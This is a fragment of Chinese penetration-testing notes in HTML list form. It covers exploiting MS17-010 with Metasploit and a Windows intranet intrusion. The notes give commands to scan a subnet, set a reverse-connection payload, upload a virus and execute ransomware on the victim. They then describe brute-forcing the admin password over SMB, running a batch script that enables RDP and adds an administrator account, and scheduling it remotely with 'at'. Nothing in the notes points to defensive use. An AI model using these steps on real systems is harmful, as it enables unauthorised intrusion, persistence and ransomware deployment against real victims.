       漏洞扫描

         定义
        </p>
        <ul>
         <li>
          <p>
           扫描和探测目标范围内的主机存在哪些安全漏洞，或扫描目标范围内的那些主机存在某个指定的漏洞

        </ul>
       </li>
       <li>
        <p>
         漏扫工具
        </p>
        <ul>
         <li>
          <p>

       <li>
        <h3>
         使用MSF扫描漏洞并利用
        </h3>
        <ul>
         <li>
          <p>
           1.搜索需要的攻击模块
          </p>
          <ul>
           <li>
            <p>
             search ms17-010
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           2.使用攻击模块
          </p>
          <ul>
           <li>
            <p>
             use 模块名称
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           3.设置扫描范围
          </p>
          <ul>
           <li>
            <p>
             set rhosts 192.168.12.0/24
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           4.设置扫描线程
          </p>
          <ul>
           <li>
            <p>
             set thread 50
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           5.开始扫描
          </p>
          <ul>
           <li>
            <p>
             run
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           6.更换攻击模块为漏洞利用
          </p>
         </li>
         <li>
          <p>
           7.查看可用攻击载荷
          </p>
          <ul>
           <li>
            <p>
             show payloads
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           8.设置攻击载荷
          </p>
          <ul>
           <li>
            <p>
             set payload 攻击载荷名称
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           9.设置被攻击主机IP地址
          </p>
          <ul>
           <li>
            <p>
             set rhost IP地址
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           10.设置反向连接的控制机IP地址
          </p>
          <ul>
           <li>
            <p>
             set lhost IP地址
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           11.开始攻击
          </p>
          <ul>
           <li>
            <p>
             run
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           12.上传病毒
          </p>
          <ul>
           <li>
            <p>
             upload 本地文件路径 远程主机路径
            </p>
           </li>
          </ul>
         </li>
         <li>
          <p>
           13.执行勒索病毒
          </p>
          <ul>
           <li>
            <p>
             execute -f 勒索病毒路径
            </p>
           </li>
          </ul>
         </li>
        </ul>
       </li>
      </ul>
     </li>
     <li>
      <h2>
       Windows内网渗透
      </h2>
      <ul>
       <li>
        <h4>
         1.扫描对方操作系统和开放的端口
        </h4>
        <ul>
         <li>
          <p>
           确定对方是Windows系统开启了445接口
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         2.针对该端口服务暴力破解Windows管理员账号密码
        </h4>
       </li>
       <li>
        <h4>
         3.与对方建立空连接
        </h4>
        <ul>
         <li>
          <p>
           net use \\对方ip地址\ipc$
          </p>
         </li>
         <li>
          <p>
           需要输入对方的管理员账号密码
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         4.制作开启RDP和创建管理员账户的脚本bat
        </h4>
        <ul>
         <li>
          <p>
           REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
          </p>
         </li>
         <li>
          <p>
           net user 用户名 密码 /add
          </p>
         </li>
         <li>
          <p>
           net local group administrator 用户名 /add
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         5.访问对方C盘默认共享，将bat复制到对方C盘
        </h4>
        <ul>
         <li>
          <p>
           在文件资源管理器地址栏中输入 \\对方IP地址\c$
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         6.查看对方的系统时间
        </h4>
        <ul>
         <li>
          <p>
           net time \\对方IP地址
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         7.给对方创建任务计划，定时执行BAT程序，开启RDP
        </h4>
        <ul>
         <li>
          <p>
           at \\对方ip地址 时间 执行的文件路径
          </p>
         </li>
        </ul>
       </li>
       <li>
        <h4>
         8.使用先前创建的管理员账号登陆RDP
        </h4>
       </li>
      </ul>
     </li>
    </ul>
